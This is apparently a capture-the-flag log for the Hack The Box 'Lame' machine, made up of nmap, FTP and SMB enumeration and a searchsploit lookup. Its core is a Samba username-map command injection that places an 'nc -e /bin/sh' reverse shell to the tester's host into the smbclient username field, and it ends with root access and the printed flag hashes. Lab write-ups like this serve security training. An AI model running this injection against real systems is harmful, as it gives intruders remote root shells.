```shell
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.3
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-16 00:42 EST
Nmap scan report for 10.10.10.3
Host is up (0.38s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-02-16T00:47:43-05:00
|_clock-skew: mean: 2h34m22s, deviation: 3h32m10s, median: 4m20s

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   425.78 ms 10.10.16.1
2   425.79 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.22 seconds
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ ftp 10.10.10.3  
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ^C
ftp> 
221 Goodbye.
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -L 10.10.10.3                 
Enter WORKGROUP\kali's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
                       
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.3\\print$                                                                                                                                                  1 ⨯
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.3\\tmp                                                                                                                                                     1 ⨯
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Feb 16 00:51:42 2022
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  5561.jsvc_up                        R        0  Wed Feb 16 00:42:06 2022
  .ICE-unix                          DH        0  Wed Feb 16 00:41:03 2022
  vmware-root                        DR        0  Wed Feb 16 00:41:26 2022
  .X11-unix                          DH        0  Wed Feb 16 00:41:28 2022
  .X0-lock                           HR       11  Wed Feb 16 00:41:28 2022
  vgauthsvclog.txt.0                  R     1600  Wed Feb 16 00:41:01 2022

                7282168 blocks of size 1024. 5386540 blocks available
smb: \> get 5561.jsvc_up 
NT_STATUS_ACCESS_DENIED opening remote file \5561.jsvc_up
smb: \> cd vmware-root\
smb: \vmware-root\> dir
NT_STATUS_ACCESS_DENIED listing \vmware-root\*
smb: \vmware-root\> cd ../
smb: \> get vgauthsvclog.txt.0 
getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> 
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ cat vgauthsvclog.txt.0     
[Feb 16 00:41:00.618] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Feb 16 00:41:00.625] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Feb 16 00:41:00.625] [ message] [VGAuthService] Group 'service'
[Feb 16 00:41:00.625] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Feb 16 00:41:00.625] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Feb 16 00:41:00.836] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Feb 16 00:41:00.836] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Feb 16 00:41:00.836] [ message] [VGAuthService] Group 'service'
[Feb 16 00:41:00.836] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Feb 16 00:41:00.836] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Feb 16 00:41:00.836] [ message] [VGAuthService] Cannot load message catalog for domain 'VGAuthService', language 'C', catalog dir '.'.
[Feb 16 00:41:00.836] [ message] [VGAuthService] INIT SERVICE
[Feb 16 00:41:00.836] [ message] [VGAuthService] Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
[Feb 16 00:41:00.936] [ message] [VGAuthService] SAMLCreateAndPopulateGrammarPool: Using '/usr/lib/vmware-vgauth/schemas' for SAML schemas
[Feb 16 00:41:01.025] [ message] [VGAuthService] SAML_Init: Allowing 300 of clock skew for SAML date validation
[Feb 16 00:41:01.025] [ message] [VGAuthService] BEGIN SERVICE
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ searchsploit samba 3.0                                                                                                   
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                       | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                     | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                           | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                         | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                     | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                   | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                                                   | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                                          | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                                           | linux/remote/364.pl
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                      | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                              | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.3\\ADMIN$ -U './=`nohup nc -e /bin/sh 10.10.16.4 1234`'       
session setup failed: NT_STATUS_LOGON_FAILURE
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.3\\ADMIN$ -U DOMAIN/'./=`nohup nc -e /bin/sh 10.10.16.4 1234`'
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ nc -lvp 1234
listening on [any] 1234 ...

10.10.10.3: inverse host lookup failed: Unknown host
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.3] 35704

whoami
root

pwd
/

cd /root

ls
Desktop
reset_logs.sh
root.txt
vnc.log

cat root.txt
c534f7104b59f94fe988c931e0e676b6

cd ../

cd /home

ls
ftp
makis
service
user

cd makis

ls
user.txt

cat user.txt
4c1ae3942e33a7050f0f10b39ad0ffce
```
